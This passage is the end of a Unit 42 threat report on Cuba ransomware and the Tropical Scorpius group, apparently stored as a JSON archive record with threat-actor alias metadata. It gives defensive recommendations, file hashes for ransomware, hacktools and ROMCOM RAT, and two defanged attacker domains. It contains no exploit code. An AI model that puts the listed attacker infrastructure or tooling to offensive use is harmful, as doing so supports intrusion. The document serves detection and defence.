and](https://www.paloaltonetworks.com/network-security/advanced-url-filtering) [DNS Security identify domains associated with this group](https://www.paloaltonetworks.com/network-security/dns-security)\nas malicious.\n\n[Indicators of compromise and associated TTPs can be found in the Tropical Scorpius ATOM.](https://unit42.paloaltonetworks.com/atoms/tropicalscorpius/)\n\nIf you think you may have been impacted or have an urgent matter, get in touch with the Unit\n42 Incident Response team or call:\n\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42)\nEMEA: +31.20.299.3130\nAPAC: +65.6983.8730\nJapan: +81.50.1790.0200\n\nIf you have cyber insurance, you can request Unit 42 by name. You can also take\n[preventative steps by requesting any of our cyber risk management services.](https://www.paloaltonetworks.com/unit42/assess)\n\n## Conclusion\n\nTropical Scorpius remains an active threat. The group’s activity makes it clear that an\napproach to tradecraft using a hybrid of more nuanced tools focusing on low-level Windows\ninternals for defense evasion and local privilege escalation can be highly effective during an\nintrusion.\n\nCoupled with a splash of well-adopted and successful crimeware techniques, this presents\nunique challenges to defenders.\n\nUnit 42 recommends that defenders have advanced logging capabilities deployed and\nconfigured properly such as Sysmon, Windows Command Line logging and PowerShell\nlogging – ideally forwarding to a Security Information and Event Management tool (SIEM) to\ncreate queries and detection opportunities. Keep computer systems patched and up to date\nwherever possible to reduce attack surface related to exploitation techniques.\n\nDeploy an XDR/EDR solution to perform in-memory inspection and detect process injection\ntechniques. Perform threat hunting looking for signs of unusual behavior related to security\nproduct defense evasion, service accounts for lateral movement and domain administratorrelated user behavior.\n\n## Indicators of Compromise\n\nDriver Dropper:\n\n\n-----\n\n07905de4b4be02665e280a56678c7de67652aee318487a44055700396d37ecd0\naf6561ad848aa1ba53c62a323de230b18cfd30d8795d4af36bf1ce6c28e3fd4e\n\n24e018c8614c70c940c3b5fa8783cb2f67cb13f08112430a4d10013e0a324eaa\n\nZeroLogon Hacktool:\n\nab5a3bbad1c4298bc287d0ac8c27790d68608393822da2365556ba99d52c5dfb\n\n6866e82d0f6f6d8cf5a43d02ad523f377bb0b374d644d2f536ec7ec18fdaf576\n\n3febf726ffb4f4a4186571d05359d2851e52d5612c5818b2b167160d367f722c\n\n3a8b7c1fe9bd9451c0a51e4122605efc98e7e4e13ed117139a13e4749e211ed0\n\n36bc32becf287402bf0e9c918de22d886a74c501a33aa08dcb9be2f222fa6e24\n\n1450f7c85bfec4f5ba97bcec4249ae234158a0bf9a63310e3801a00d30d9abcc\n\nCuba Ransomware:\n\n0a3517d8d382a0a45334009f71e48114d395a22483b01f171f2c3d4a9cfdbfbf\n\n0eff3e8fd31f553c45ab82cc5d88d0105626d0597afa5897e78ee5a7e34f71b3\n\nPrivilege Escalation Tool:\n\na4665231bad14a2ac9f2e20a6385e1477c299d97768048cb3e9df6b45ae54eb8\n\nKerberCache Hacktool:\n\ncfe7b462a8224b2fbf2b246f05973662bdabc2c4e8f4728c9a1b977fac010c15\n\nROMCOM RAT:\n\nB5978cf7d0c275d09bedf09f07667e139ad7fed8f9e47742e08c914c5cf44a53\n\n324ccd4bf70a66cc14b1c3746162b908a688b2b124ad9db029e5bd42197cfe99\n\n3496e4861db584cc3239777e137f4022408fb6a7c63152c57e019cf610c8276e\n\nInfrastructure:\n\nCombinedResidency[.]org\n\noptasko[.]com\n\n## Additional Resources\n\n[From Zero to Domain Admin](https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/)\n\n[Qbot and Zerologon Lead to Full Domain Compromise](https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/)\n\n[CVE-2022-24521: Windows Common Log File System (CLFS) Logical-Error Vulnerability](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-24521.html)\n\n[Industrial Spy data extortion market gets into the ransomware game](https://www.bleepingcomputer.com/news/security/industrial-spy-data-extortion-market-gets-into-the-ransomware-game/)\n\n(Ex)Change of Pace: UNC2596 Observed Leveraging Vulnerabilities to Deploy Cuba\nRansomware\n\n\n-----\n\n_Updated Aug. 10, 2022, at 9:30 a.m. PT._\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-10 - Novel News on Cuba Ransomware- Greetings From Tropical Scorpius.pdf"
    ],
    "report_names": [
        "2022-08-10 - Novel News on Cuba Ransomware- Greetings From Tropical Scorpius.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4b9608d-af69-43bc-a08a-38167ac6306a",
            "created_at": "2023-01-06T13:46:39.335061Z",
            "updated_at": "2025-03-27T02:00:03.053961Z",
            "deleted_at": null,
            "main_name": "LAPSUS",
            "aliases": [
                "LAPSUS$",
                "DEV-0537",
                "SLIPPY SPIDER",
                "Strawberry Tempest"
            ],
            "source_name": "MISPGALAXY:LAPSUS",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d58052ba-978b-4775-985a-26ed8e64f98c",
            "created_at": "2023-09-07T02:02:48.069895Z",
            "updated_at": "2025-03-27T02:02:10.181465Z",
            "deleted_at": null,
            "main_name": "Tropical Scorpius",
            "aliases": [
                "DEV-0978",
                "RomCom",
                "Storm-0978",
                "Tropical Scorpius",
                "UNC2596",
                "Void Rabisu"
            ],
            "source_name": "ETDA:Tropical Scorpius",
            "tools": [
                "COLDDRAW",
                "Cuba",
                "Industrial Spy",
                "PEAPOD",
                "ROMCOM",
                "ROMCOM RAT",
                "SingleCamper",
                "SnipBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "fecc0d5a-3654-425d-9290-b6d0b4105463",
            "created_at": "2023-10-17T02:00:08.330061Z",
            "updated_at": "2025-03-27T02:00:03.141943Z",
            "deleted_at": null,
            "main_name": "Void Rabisu",
            "aliases": [
                "Tropical Scorpius"
            ],
            "source_name": "MISPGALAXY:Void Rabisu",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "555e2cac-931d-4ad4-8eaa-64df6451059d",
            "created_at": "2023-01-06T13:46:39.48103Z",
            "updated_at": "2025-03-27T02:00:03.105297Z",
            "deleted_at": null,
            "main_name": "RomCom",
            "aliases": [
                "Storm-0978",
                "UAT-5647"
            ],
            "source_name": "MISPGALAXY:RomCom",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4f56bb34-098d-43f6-a0e8-99616116c3ea",
            "created_at": "2024-06-19T02:03:08.048835Z",
            "updated_at": "2025-03-27T02:05:17.365266Z",
            "deleted_at": null,
            "main_name": "GOLD FLAMINGO",
            "aliases": [
                "Tropical Scorpius ",
                "UAC-0132 ",
                "UAC-0132 ",
                "UNC2596 ",
                "Void Rabisu ",
                "REF9019 "
            ],
            "source_name": "Secureworks:GOLD FLAMINGO",
            "tools": [
                " Cobalt Strike",
                " Cuba",
                " Meterpreter",
                " Mimikatz",
                " ROMCOM RAT",
                "Chanitor"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535634,
    "ts_updated_at": 1743041645,
    "ts_creation_date": 1660795143,
    "ts_modification_date": 1660795143,
    "files": {
        "pdf": "https://archive.orkl.eu/3cb1d7711e359fd5fd81b6ac187c03dc7bf0dde0.pdf",
        "text": "https://archive.orkl.eu/3cb1d7711e359fd5fd81b6ac187c03dc7bf0dde0.txt",
        "img": "https://archive.orkl.eu/3cb1d7711e359fd5fd81b6ac187c03dc7bf0dde0.jpg"
    }
}